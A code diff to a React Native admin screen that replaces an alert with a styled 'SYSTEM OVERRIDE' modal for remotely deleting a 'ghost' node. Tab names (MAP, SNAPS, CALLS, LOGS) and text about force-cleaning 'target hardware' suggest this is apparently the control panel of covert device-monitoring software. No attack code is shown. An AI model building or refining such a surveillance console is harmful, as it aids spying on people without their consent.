@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { View, ScrollView, StyleSheet, Text, Vibration, SafeAreaView, StatusBar, TouchableOpacity, ActivityIndicator, Alert } from 'react-native';
+import { View, ScrollView, StyleSheet, Text, Vibration, SafeAreaView, StatusBar, TouchableOpacity, ActivityIndicator, Alert, Modal } from 'react-native';
 import { MaterialCommunityIcons } from '@expo/vector-icons';
 import { captureRef } from 'react-native-view-shot';
 import * as MediaLibrary from 'expo-media-library';
@@ -19,6 +19,8 @@ const AdminScreen = ({ onLogout, name, onShowGuide }) => {
   const [selectedGhostId, setSelectedGhostId] = useState(null);
   const [activeTab, setActiveTab] = useState('FEED'); // FEED, MAP, SNAPS, CALLS, LOGS
   const [isCapturing, setIsCapturing] = useState(false);
+  const [deleteModalVisible, setDeleteModalVisible] = useState(false);
+  const [nodeToDelete, setNodeToDelete] = useState(null);
   const viewRef = useRef();
   const feedRef = useRef();
   const heartbeatCache = useRef({});
@@ -347,21 +349,8 @@ const AdminScreen = ({ onLogout, name, onShowGuide }) => {
                   ]}
                   onPress={() => setSelectedGhostId(ghost.name)}
                   onLongPress={() => {
-                    Alert.alert(
-                      "PERMANENT DELETION",
-                      `Are you sure you want to delete '${ghost.name.toUpperCase()}' permanently? This will erase it from the master database and force-clean the target app.`,
-                      [
-                        { text: "CANCEL", style: "cancel" },
-                        { 
-                          text: "UNINSTALL & DESTROY", 
-                          style: "destructive",
-                          onPress: () => {
-                            socket.emit('delete_node', { targetId: ghost.name });
-                          }
-                        }
-                      ],
-                      { cancelable: true }
-                    );
+                    setNodeToDelete(ghost.name);
+                    setDeleteModalVisible(true);
                   }}
                 >
                   <MaterialCommunityIcons 
@@ -508,6 +497,60 @@ const AdminScreen = ({ onLogout, name, onShowGuide }) => {
           </View>
         </View>
       )}
+
+      {/* CUSTOM DESTROY MODAL */}
+      <Modal
+        animationType="fade"
+        transparent={true}
+        visible={deleteModalVisible}
+        onRequestClose={() => setDeleteModalVisible(false)}
+      >
+        <View style={styles.modalOverlay}>
+          <View style={styles.modalContent}>
+            <View style={styles.modalHeader}>
+              <MaterialCommunityIcons name="skull-crossbones" size={28} color="#EF4444" />
+              <Text style={styles.modalTitle}>SYSTEM OVERRIDE</Text>
+            </View>
+            
+            <Text style={styles.modalWarning}>
+              WARNING: BURN PROTOCOL INITIATED.
+            </Text>
+            
+            <Text style={styles.modalDesc}>
+              You are about to execute a remote burn on:
+            </Text>
+            
+            <View style={styles.targetBox}>
+              <Text style={styles.targetText}>{nodeToDelete?.toUpperCase()}</Text>
+            </View>
+            
+            <Text style={styles.modalDesc}>
+              This will permanently disintegrate the node from the master registry and force-clean the target hardware. This action cannot be undone.
+            </Text>
+
+            <View style={styles.modalActions}>
+              <TouchableOpacity 
+                style={styles.modalCancelBtn} 
+                onPress={() => setDeleteModalVisible(false)}
+              >
+                <Text style={styles.modalCancelTxt}>ABORT</Text>
+              </TouchableOpacity>
+              
+              <TouchableOpacity 
+                style={styles.modalDestroyBtn} 
+                onPress={() => {
+                  socket.emit('delete_node', { targetId: nodeToDelete });
+                  setDeleteModalVisible(false);
+                }}
+              >
+                <MaterialCommunityIcons name="fire" size={16} color="#0F172A" style={{marginRight: 6}} />
+                <Text style={styles.modalDestroyTxt}>CONFIRM BURN</Text>
+              </TouchableOpacity>
+            </View>
+          </View>
+        </View>
+      </Modal>
+
     </SafeAreaView>
   );
 };
@@ -603,7 +646,22 @@ const styles = StyleSheet.create({
   iconCirclePulse: { width: 80, height: 80, borderRadius: 40, backgroundColor: 'rgba(56, 189, 248, 0.1)', borderWidth: 1, borderColor: 'rgba(56, 189, 248, 0.3)', justifyContent: 'center', alignItems: 'center', marginBottom: 20 },
   initTitle: { color: '#F8FAFC', fontSize: 18, fontWeight: '800', letterSpacing: 1.5, marginBottom: 8, textAlign: 'center' },
   initDesc: { color: '#94A3B8', fontSize: 13, textAlign: 'center', lineHeight: 20, marginBottom: 24, paddingHorizontal: 10 },
-  logPreviewBox: { height: 200, width: '100%', borderRadius: 12, overflow: 'hidden', borderWidth: 1, borderColor: '#334155' }
+  logPreviewBox: { height: 200, width: '100%', borderRadius: 12, overflow: 'hidden', borderWidth: 1, borderColor: '#334155' },
+
+  // Modal
+  modalOverlay: { flex: 1, backgroundColor: 'rgba(0, 0, 0, 0.85)', justifyContent: 'center', alignItems: 'center', padding: 20 },
+  modalContent: { width: '100%', backgroundColor: '#0B0F19', borderRadius: 16, padding: 24, borderWidth: 2, borderColor: '#EF4444', shadowColor: '#EF4444', shadowOffset: { width: 0, height: 0 }, shadowOpacity: 0.5, shadowRadius: 20, elevation: 15 },
+  modalHeader: { flexDirection: 'row', alignItems: 'center', marginBottom: 16, borderBottomWidth: 1, borderBottomColor: '#334155', paddingBottom: 12 },
+  modalTitle: { color: '#EF4444', fontSize: 18, fontWeight: '900', letterSpacing: 2, marginLeft: 12 },
+  modalWarning: { color: '#F59E0B', fontSize: 13, fontWeight: '800', letterSpacing: 1, marginBottom: 12 },
+  modalDesc: { color: '#94A3B8', fontSize: 12, lineHeight: 18, marginBottom: 12 },
+  targetBox: { backgroundColor: 'rgba(239, 68, 68, 0.1)', borderWidth: 1, borderColor: 'rgba(239, 68, 68, 0.4)', padding: 12, borderRadius: 8, alignItems: 'center', marginBottom: 16 },
+  targetText: { color: '#F8FAFC', fontSize: 18, fontWeight: '900', letterSpacing: 3 },
+  modalActions: { flexDirection: 'row', justifyContent: 'space-between', marginTop: 8, gap: 12 },
+  modalCancelBtn: { flex: 1, height: 46, justifyContent: 'center', alignItems: 'center', borderRadius: 8, backgroundColor: '#1E293B', borderWidth: 1, borderColor: '#334155' },
+  modalCancelTxt: { color: '#94A3B8', fontSize: 12, fontWeight: '800', letterSpacing: 1.5 },
+  modalDestroyBtn: { flex: 1.5, height: 46, flexDirection: 'row', justifyContent: 'center', alignItems: 'center', borderRadius: 8, backgroundColor: '#EF4444', shadowColor: '#EF4444', shadowOffset: { width: 0, height: 4 }, shadowOpacity: 0.4, shadowRadius: 8, elevation: 5 },
+  modalDestroyTxt: { color: '#0F172A', fontSize: 12, fontWeight: '900', letterSpacing: 1.5 }
 });
 
 export default AdminScreen;
